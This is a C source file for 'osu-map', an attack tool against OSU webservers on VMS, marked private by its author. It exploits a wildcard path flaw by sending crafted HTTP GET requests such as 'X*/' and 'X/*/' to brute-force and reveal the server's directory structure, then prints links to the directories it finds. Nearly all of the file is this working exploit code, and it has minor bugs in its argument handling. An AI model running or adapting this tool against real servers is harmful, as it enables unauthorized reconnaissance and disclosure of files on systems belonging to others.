/*
 * osu-map.c 
 * author: Iruata Souza (muzgo)
 * 
 * maps an OSU VMS webserver structure via brute-force.
 * based on vulnerabilities found by me and Julio Cesar Fort.
 *
 * thanks to: Julio Cesar Fort, Diego Casati, Deathrow OpenVMS Cluster
 *
 * private
 */
  
#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netdb.h>

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void	usage(void);

enum {
	BUFLEN = 128
};

ushort
validfile(const char *s)
{
	return(strstr(s, "HTTP/1.0 200")?1:0);
}

int
find(const char *host, const uint port, char *file)
{
	int r, s, n;
	char buf[12];
	struct hostent *h;
	struct sockaddr_in channel;

	h = gethostbyname(host);
	if(!h)
		err(1, "gethostbyname");

	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s < 0)
		err(1, "socket");
	
	bzero(&channel, sizeof(channel));
	channel.sin_family = AF_INET;
	memcpy(&channel.sin_addr.s_addr, h->h_addr, h->h_length);
	channel.sin_port = htons(port);

	r = connect(s, (struct sockaddr *) &channel, sizeof(struct sockaddr_in));
	if(r < 0)
		err(1, "connect");

	write(s, "GET /", 5);
/*	write(s, "/", 1); */
	write(s, file, strlen(file));
	write(s, " ", 1);
	write(s, "HTTP/1.0\r\n\r\n", 12);

	n = read(s, buf, 12);

	if(!validfile(buf))
		r = 0;
	else
		r = 1;
	close(s);
	return r;
}

int
map(const char *host, const uint port)
{
	char c, d[255], t[255];
	int i = 0;

	for(c = 'A'; c <= 'Z'; c++){
		if(c < ':' || c > '@'){	/* invalid chars in dir spec */
				d[i] = c;
				d[i+1]='\0';
				strcpy(t, d);
				/* directories are tested as
				 * DIR* / (cut the space!) till 
				 * validfile() returns false
				 */
				t[strlen(d)]='*';
				t[strlen(d)+1]='/';
				t[strlen(d)+2]='\0';
			
				if(find(host, port, t)){
					strcpy(t, d);
					t[strlen(d)]='/';
					t[strlen(d)+1]='*';
					t[strlen(d)+2]='/';
					t[strlen(d)+3]='\0';
				
					if(find(host, port, t)){
						printf("<a href=\"http://%s:%d/%s\">%s</a>\n", 
							host, port, t,t);
						break;
					}
					i++;
					c = '0'; 
				}
		}
	}
	return 0;
}

int
main(int argc, char *argv[])
{
	if(argc < 2)
		usage();
	map(argv[1], atoi(argv[2]));
	return 0;
}

void
usage(void)
{
	(void)fprintf(stderr, "usage: osu-map srv port\n");
	exit(1);
}

